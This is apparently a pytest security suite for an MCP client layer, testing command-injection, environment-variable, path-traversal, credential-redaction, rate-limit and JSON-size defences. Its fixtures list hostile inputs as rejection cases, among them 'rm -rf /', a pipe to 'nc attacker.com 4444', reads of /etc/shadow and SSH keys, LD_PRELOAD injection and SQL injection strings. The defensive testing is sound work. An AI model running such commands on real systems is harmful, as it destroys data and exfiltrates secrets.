"""
MCP Security Test Suite

Tests for security vulnerabilities, attack scenarios, and defensive measures.
All tests in this suite MUST pass before merging to production.
"""

import pytest
import asyncio
import os
import tempfile
from unittest.mock import Mock, AsyncMock, patch
from pathlib import Path

# Import MCP components
from src.core.mcp import (
    MCPConfig,
    MCPServerConfig,
    MCPManager,
    TransportType,
    ServerType
)


class TestCommandInjectionPrevention:
    """Test protection against command injection attacks"""

    def test_reject_shell_metacharacters(self):
        """CRITICAL: Reject commands with shell metacharacters"""
        from src.core.mcp.security import validate_command, MCPSecurityError

        # Test various injection attempts
        malicious_commands = [
            "npx server; rm -rf /",
            "npx server && cat /etc/passwd",
            "npx server | nc attacker.com 4444",
            "npx server `whoami`",
            "npx server $(whoami)",
            "npx server > /etc/passwd",
            "npx server < /etc/shadow"
        ]

        for cmd in malicious_commands:
            with pytest.raises(MCPSecurityError):
                validate_command(cmd)

    def test_allow_only_whitelisted_commands(self):
        """CRITICAL: Only allow commands from allowlist"""
        from src.core.mcp.security import validate_command, MCPSecurityError

        # Should pass - whitelisted
        valid_commands = [
            "npx @modelcontextprotocol/server-filesystem",
            "python3 -m mcp_server",
            "node server.js"
        ]

        for cmd in valid_commands:
            result = validate_command(cmd)
            assert isinstance(result, list)
            assert result[0] in ["npx", "python3", "node"]

        # Should fail - not whitelisted
        with pytest.raises(MCPSecurityError):
            validate_command("/usr/bin/malicious_script")

        with pytest.raises(MCPSecurityError):
            validate_command("bash -c 'rm -rf /'")

    def test_handle_quoted_arguments_safely(self):
        """Ensure quoted arguments don't bypass validation"""
        from src.core.mcp.security import validate_command

        # Should properly parse quoted args
        cmd = 'npx server --arg "value with spaces"'
        result = validate_command(cmd)
        assert "value with spaces" in result

        # But reject malicious quoted content
        with pytest.raises(Exception):
            validate_command('npx server --arg "$(rm -rf /)"')

    def test_empty_command_rejected(self):
        """Reject empty or None commands"""
        from src.core.mcp.security import validate_command

        with pytest.raises(ValueError):
            validate_command("")

        with pytest.raises(ValueError):
            validate_command(None)

    @pytest.mark.asyncio
    async def test_subprocess_creation_with_safe_command(self):
        """Verify subprocess creation uses validated commands"""
        from src.core.mcp.client import StdioTransport

        # Should work with valid command
        transport = StdioTransport(
            command="echo 'test'",
            env={},
            args=[]
        )

        # Mock the actual subprocess to avoid execution
        with patch('asyncio.create_subprocess_exec', new_callable=AsyncMock) as mock_exec:
            mock_process = Mock()
            mock_process.pid = 12345
            mock_exec.return_value = mock_process

            await transport.connect()

            # Verify validated command was used
            call_args = mock_exec.call_args[0]
            assert 'echo' in call_args


class TestEnvironmentVariableInjection:
    """Test protection against environment variable injection"""

    def test_reject_dangerous_environment_variables(self):
        """CRITICAL: Block dangerous environment variables"""
        from src.core.mcp.security import sanitize_env_vars, MCPSecurityError

        dangerous_vars = {
            "LD_PRELOAD": "/tmp/malicious.so",
            "LD_LIBRARY_PATH": "/tmp/evil",
            "PYTHONPATH": "/attacker/code",
            "NODE_PATH": "/malicious/modules"
        }

        with pytest.raises(MCPSecurityError):
            sanitize_env_vars(dangerous_vars)

    def test_allow_only_whitelisted_env_vars(self):
        """Only allow environment variables from allowlist"""
        from src.core.mcp.security import sanitize_env_vars

        # Should pass - whitelisted patterns
        safe_vars = {
            "ALLOWED_DIRECTORIES": "/tmp,/home/user",
            "GITHUB_TOKEN": "ghp_xxxx",
            "MCP_SERVER_PORT": "8080",
            "PATH": "/usr/bin"
        }

        result = sanitize_env_vars(safe_vars)
        assert "ALLOWED_DIRECTORIES" in result
        assert "GITHUB_TOKEN" in result
        assert "MCP_SERVER_PORT" in result

    def test_sanitize_env_var_values(self):
        """Ensure environment variable values are sanitized"""
        from src.core.mcp.security import sanitize_env_vars, MCPSecurityError

        # Should reject values with shell metacharacters
        malicious_values = {
            "MCP_CONFIG": "; rm -rf /",
            "ALLOWED_DIRECTORIES": "/tmp && cat /etc/passwd",
            "GITHUB_TOKEN": "`whoami`"
        }

        with pytest.raises(MCPSecurityError):
            sanitize_env_vars(malicious_values)

    def test_minimal_environment_passed_to_subprocess(self):
        """Verify subprocess gets minimal, safe environment"""
        from src.core.mcp.client import StdioTransport

        transport = StdioTransport(
            command="echo test",
            env={"MCP_CONFIG": "value"},
            args=[]
        )

        with patch('asyncio.create_subprocess_exec', new_callable=AsyncMock) as mock_exec:
            mock_process = Mock()
            mock_exec.return_value = mock_process

            await transport.connect()

            # Check that env was sanitized
            call_kwargs = mock_exec.call_args[1]
            passed_env = call_kwargs['env']

            # Should not contain full os.environ
            assert "LD_PRELOAD" not in passed_env
            assert "PYTHONPATH" not in passed_env


class TestPathTraversalPrevention:
    """Test protection against path traversal attacks"""

    def test_reject_path_traversal_attempts(self):
        """CRITICAL: Block path traversal patterns"""
        from src.core.mcp.security import validate_path, MCPSecurityError

        malicious_paths = [
            "/etc/passwd",
            "../../../etc/shadow",
            "/root/.ssh/id_rsa",
            "../../.ssh/id_rsa",
            "/etc/../etc/passwd",
            "/tmp/../../root/.bashrc"
        ]

        for path in malicious_paths:
            with pytest.raises(MCPSecurityError):
                validate_path(path, operation="read")

    def test_allow_only_safe_directories(self):
        """Only allow access to safe, whitelisted directories"""
        from src.core.mcp.security import validate_path

        # Create temporary safe directory
        with tempfile.TemporaryDirectory() as tmpdir:
            safe_path = os.path.join(tmpdir, "test.txt")
            Path(safe_path).touch()

            # Should work for allowed directory
            result = validate_path(safe_path, operation="read")
            assert result  # Returns absolute path

    def test_working_directory_validation(self):
        """Validate working_directory in server config"""
        # Should fail for forbidden directories
        with pytest.raises(ValueError):
            MCPServerConfig(
                name="test",
                type=ServerType.FILESYSTEM,
                transport=TransportType.STDIO,
                command="npx server",
                working_directory="/etc"
            )

        with pytest.raises(ValueError):
            MCPServerConfig(
                name="test",
                type=ServerType.FILESYSTEM,
                transport=TransportType.STDIO,
                command="npx server",
                working_directory="/root"
            )

    def test_resolve_symlinks_before_validation(self):
        """Ensure symlinks are resolved to prevent bypasses"""
        from src.core.mcp.security import validate_path, MCPSecurityError

        with tempfile.TemporaryDirectory() as tmpdir:
            # Create symlink to forbidden directory
            link_path = os.path.join(tmpdir, "link_to_etc")
            try:
                os.symlink("/etc", link_path)

                # Should detect and reject
                with pytest.raises(MCPSecurityError):
                    validate_path(link_path, operation="read")
            except OSError:
                pytest.skip("Cannot create symlinks (permission issue)")


class TestCredentialSecurity:
    """Test secure credential handling"""

    def test_credentials_use_secret_str(self):
        """CRITICAL: Credentials must use SecretStr"""
        from pydantic import SecretStr

        config = MCPServerConfig(
            name="github",
            type=ServerType.GITHUB,
            transport=TransportType.STDIO,
            command="npx server",
            authentication={"token": SecretStr("secret_value")}
        )

        # Verify SecretStr is used
        assert isinstance(config.authentication["token"], SecretStr)

        # Verify secret is not exposed in dict()
        config_dict = config.dict()
        assert config_dict["authentication"] == "***REDACTED***"

    def test_credentials_redacted_in_logs(self):
        """Credentials should never appear in logs"""
        from src.core.mcp.config import MCPServerConfig
        from pydantic import SecretStr
        import logging
        from io import StringIO

        # Capture log output
        log_stream = StringIO()
        handler = logging.StreamHandler(log_stream)
        logger = logging.getLogger("test")
        logger.addHandler(handler)
        logger.setLevel(logging.INFO)

        config = MCPServerConfig(
            name="test",
            type=ServerType.GITHUB,
            transport=TransportType.STDIO,
            command="npx server",
            authentication={"token": SecretStr("SUPER_SECRET_TOKEN")}
        )

        # Log the config
        logger.info(f"Config: {config.dict()}")

        # Verify secret is not in logs
        log_output = log_stream.getvalue()
        assert "SUPER_SECRET_TOKEN" not in log_output
        assert "REDACTED" in log_output

    def test_secure_credential_retrieval(self):
        """Test safe method to retrieve credentials"""
        from pydantic import SecretStr

        config = MCPServerConfig(
            name="github",
            type=ServerType.GITHUB,
            transport=TransportType.STDIO,
            command="npx server",
            authentication={"token": SecretStr("my_token")}
        )

        # Should have safe accessor method
        token_value = config.get_auth_value("token")
        assert token_value == "my_token"

        # Non-existent key should return None
        assert config.get_auth_value("nonexistent") is None


class TestRateLimiting:
    """Test rate limiting enforcement"""

    @pytest.mark.asyncio
    async def test_rate_limit_enforced(self):
        """CRITICAL: Rate limits must be enforced"""
        from src.core.mcp.utils import RateLimiter, MCPRateLimitError

        limiter = RateLimiter(max_requests=5, window_seconds=1)

        # First 5 requests should succeed
        for i in range(5):
            limiter.record_request("agent_1")

        # 6th request should fail
        with pytest.raises(MCPRateLimitError):
            limiter.record_request("agent_1")

    @pytest.mark.asyncio
    async def test_rate_limit_per_agent(self):
        """Rate limits should be per-agent"""
        from src.core.mcp.utils import RateLimiter

        limiter = RateLimiter(max_requests=3, window_seconds=1)

        # Agent 1: 3 requests
        for i in range(3):
            limiter.record_request("agent_1")

        # Agent 2 should still be able to make requests
        limiter.record_request("agent_2")
        limiter.record_request("agent_2")

    @pytest.mark.asyncio
    async def test_rate_limit_sliding_window(self):
        """Rate limit uses sliding window (not fixed window)"""
        from src.core.mcp.utils import RateLimiter
        import time

        limiter = RateLimiter(max_requests=2, window_seconds=1)

        # Make 2 requests
        limiter.record_request("agent_1")
        limiter.record_request("agent_1")

        # Wait for window to expire
        await asyncio.sleep(1.1)

        # Should be able to make more requests now
        limiter.record_request("agent_1")  # Should not raise

    @pytest.mark.asyncio
    async def test_manager_enforces_rate_limiting(self):
        """MCPManager should enforce configured rate limits"""
        from src.core.mcp import MCPManager, MCPAgentPermissions

        config = MCPConfig(
            enabled=True,
            servers=[],
            agent_permissions=[
                MCPAgentPermissions(
                    agent_name="TEST_AGENT",
                    allowed_servers=["test_server"],
                    rate_limit=2  # Only 2 requests per minute
                )
            ]
        )

        manager = MCPManager(config=config)
        manager.initialized = True

        # Mock tool and server
        from src.core.mcp.types import MCPTool
        tool = MCPTool(name="test_tool", description="Test")
        manager.available_tools = {"test_tool": tool}
        manager.tool_to_server = {"test_tool": "test_server"}

        mock_client = Mock()
        mock_client.execute_tool = AsyncMock(return_value={"result": "ok"})
        manager.connected_servers = {"test_server": Mock(client=mock_client)}

        # First 2 requests should succeed
        await manager.execute_tool("test_tool", {}, agent_name="TEST_AGENT")
        await manager.execute_tool("test_tool", {}, agent_name="TEST_AGENT")

        # 3rd request should fail
        from src.core.mcp import MCPOperationError
        with pytest.raises(MCPOperationError, match="Rate limit exceeded"):
            await manager.execute_tool("test_tool", {}, agent_name="TEST_AGENT")


class TestJSONValidation:
    """Test JSON parsing security"""

    @pytest.mark.asyncio
    async def test_reject_oversized_json_messages(self):
        """CRITICAL: Reject JSON messages exceeding size limit"""
        from src.core.mcp.client import StdioTransport

        transport = StdioTransport(command="echo test", env={}, args=[])

        # Mock process with huge message
        huge_message = b'{"data": "' + b'x' * (15 * 1024 * 1024) + b'"}\n'

        mock_process = Mock()
        mock_stdout = AsyncMock()
        mock_stdout.readline = AsyncMock(return_value=huge_message)
        mock_process.stdout = mock_stdout
        transport.process = mock_process

        # Should reject oversized message
        with pytest.raises(ValueError, match="exceeds limit"):
            await transport.receive()

    @pytest.mark.asyncio
    async def test_reject_malformed_json(self):
        """Reject malformed JSON with clear error"""
        from src.core.mcp.client import StdioTransport

        transport = StdioTransport(command="echo test", env={}, args=[])

        mock_process = Mock()
        mock_stdout = AsyncMock()
        mock_stdout.readline = AsyncMock(return_value=b'{"invalid": json}\n')
        mock_process.stdout = mock_stdout
        transport.process = mock_process

        with pytest.raises(ValueError, match="Invalid JSON"):
            await transport.receive()

    @pytest.mark.asyncio
    async def test_validate_json_structure(self):
        """Validate JSON structure matches MCP protocol"""
        from src.core.mcp.client import StdioTransport

        transport = StdioTransport(command="echo test", env={}, args=[])

        # Non-object JSON should be rejected
        mock_process = Mock()
        mock_stdout = AsyncMock()
        mock_stdout.readline = AsyncMock(return_value=b'"just a string"\n')
        mock_process.stdout = mock_stdout
        transport.process = mock_process

        with pytest.raises(ValueError, match="Expected JSON object"):
            await transport.receive()


class TestInputValidation:
    """Test comprehensive input validation"""

    def test_validate_tool_parameters(self):
        """All tool parameters must be validated"""
        from src.core.mcp.autogen_bridge import MCPAutoGenBridge
        from src.core.mcp.types import MCPTool, ToolParameter, ToolParameterType

        bridge = MCPAutoGenBridge()

        tool = MCPTool(
            name="test",
            description="Test tool",
            parameters=[
                ToolParameter(
                    name="path",
                    type=ToolParameterType.STRING,
                    description="File path",
                    required=True
                )
            ]
        )

        # Missing required parameter
        with pytest.raises(ValueError, match="Missing required parameter"):
            bridge._validate_arguments(tool, {})

        # Wrong type
        with pytest.raises(TypeError, match="must be a string"):
            bridge._validate_arguments(tool, {"path": 123})

    def test_detect_sql_injection_patterns(self):
        """Detect SQL injection patterns in parameters"""
        from src.core.mcp.autogen_bridge import MCPAutoGenBridge
        from src.core.mcp.types import MCPTool, ToolParameter, ToolParameterType

        bridge = MCPAutoGenBridge()

        tool = MCPTool(
            name="database_query",
            description="Query database",
            parameters=[
                ToolParameter(
                    name="query",
                    type=ToolParameterType.STRING,
                    description="SQL query",
                    required=True
                )
            ],
            tags=["database"]
        )

        # Should detect SQL injection patterns
        malicious_queries = [
            "SELECT * FROM users; DROP TABLE users;",
            "SELECT * FROM users WHERE id = 1 OR 1=1",
            "SELECT * FROM users WHERE id = 1 UNION SELECT * FROM passwords",
            "SELECT * FROM users WHERE id = 1; DELETE FROM logs;"
        ]

        for query in malicious_queries:
            # Validation should log warning or raise error
            # (Implementation depends on chosen strategy)
            bridge._validate_arguments(tool, {"query": query})
            # At minimum, should log warning


class TestConcurrencyAndRaces:
    """Test thread safety and race conditions"""

    @pytest.mark.asyncio
    async def test_connection_pool_thread_safe(self):
        """Connection pool must be thread-safe"""
        from src.core.mcp.types import ConnectionPool
        from threading import Thread
        import time

        pool = ConnectionPool(max_connections=10)

        # Simulate concurrent access
        def add_connection(server_id):
            client = Mock()
            pool.release(server_id, client)
            time.sleep(0.001)  # Small delay to increase chance of race

        threads = []
        for i in range(50):
            t = Thread(target=add_connection, args=(f"server_{i % 10}",))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        # Pool should be consistent
        assert pool.active_count <= pool.max_connections

    @pytest.mark.asyncio
    async def test_concurrent_tool_execution_safe(self):
        """Concurrent tool execution should be safe"""
        from src.core.mcp import MCPManager

        manager = MCPManager()
        manager.initialized = True

        # Setup mock tool
        from src.core.mcp.types import MCPTool
        tool = MCPTool(name="test_tool", description="Test")
        manager.available_tools = {"test_tool": tool}
        manager.tool_to_server = {"test_tool": "test_server"}

        mock_client = Mock()
        mock_client.execute_tool = AsyncMock(return_value={"result": "ok"})
        manager.connected_servers = {"test_server": Mock(client=mock_client)}

        # Execute 50 concurrent requests
        tasks = [
            manager.execute_tool("test_tool", {}, agent_name="ALFRED")
            for _ in range(50)
        ]

        results = await asyncio.gather(*tasks, return_exceptions=True)

        # All should succeed
        assert len([r for r in results if not isinstance(r, Exception)]) == 50


class TestResourceExhaustion:
    """Test protection against resource exhaustion attacks"""

    @pytest.mark.asyncio
    async def test_connection_limit_enforced(self):
        """Connection pool should enforce max connections"""
        from src.core.mcp.client import MCPClientManager

        manager = MCPClientManager(max_connections=5)

        # Try to create 10 connections (should fail after 5)
        connections = []
        for i in range(10):
            try:
                # Mock successful creation
                with patch('src.core.mcp.client.StdioTransport') as mock_transport:
                    mock_transport.return_value = Mock(connect=AsyncMock())
                    with patch('src.core.mcp.client.RealMCPClient') as mock_client:
                        mock_client.return_value = Mock(connect=AsyncMock(), connected=True)

                        client = await manager.create_client(
                            server_id=f"server_{i}",
                            transport_type=TransportType.STDIO,
                            transport_config={"command": "echo", "env": {}}
                        )
                        connections.append(client)
            except RuntimeError as e:
                assert "pool exhausted" in str(e).lower()
                break

        # Should have created exactly 5
        assert len(connections) == 5

    @pytest.mark.asyncio
    async def test_cache_size_limited(self):
        """Cache should be limited in size"""
        from src.core.mcp import MCPManager

        manager = MCPManager()
        manager.cache_enabled = True

        # Fill cache with many entries
        for i in range(1000):
            manager.cache[f"key_{i}"] = {"large": "data" * 1000}

        # Cache cleanup should run and limit size
        # (Implementation will add max_cache_size config)
        # For now, just verify cache exists
        assert len(manager.cache) <= 1000


# Fixture for cleanup
@pytest.fixture(autouse=True)
def cleanup_singletons():
    """Clean up singletons after each test"""
    yield
    from src.core.mcp import reset_mcp_config, reset_mcp_manager
    reset_mcp_config()
    reset_mcp_manager()


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
